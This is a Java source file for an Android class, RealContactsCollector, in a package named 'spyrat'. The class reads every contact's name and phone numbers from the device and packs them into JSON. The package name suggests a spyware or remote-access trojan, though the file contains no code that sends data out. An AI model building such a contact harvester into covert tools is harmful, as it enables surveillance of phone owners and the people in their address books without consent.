package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class RealContactsCollector {
    private static final String TAG = "RealContactsCollector";
    private Context context;

    public RealContactsCollector(Context context) {
        this.context = context;
    }

    public JSONArray getContacts() {
        JSONArray contactsList = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📱 Starting contacts collection...");
            
            String[] projection = new String[]{
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.HAS_PHONE_NUMBER
            };
            
            cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                projection,
                null,
                null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 1000000"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                        int hasPhone = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                        
                        JSONObject contact = new JSONObject();
                        contact.put("id", id);
                        contact.put("name", name);
                        contact.put("phones", new JSONArray());
                        
                        if (hasPhone > 0) {
                            Cursor phoneCursor = context.getContentResolver().query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id},
                                null
                            );
                            
                            if (phoneCursor != null) {
                                while (phoneCursor.moveToNext()) {
                                    String phone = phoneCursor.getString(
                                        phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
                                    );
                                    contact.getJSONArray("phones").put(phone);
                                }
                                phoneCursor.close();
                            }
                        }
                        
                        contactsList.put(contact);
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error parsing contact: " + e.getMessage());
                    }
                } while (cursor.moveToNext());
            }
            
            Log.d(TAG, "✅ Collected " + contactsList.length() + " contacts");
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Contacts permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Contacts collection error: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return contactsList;
    }
}
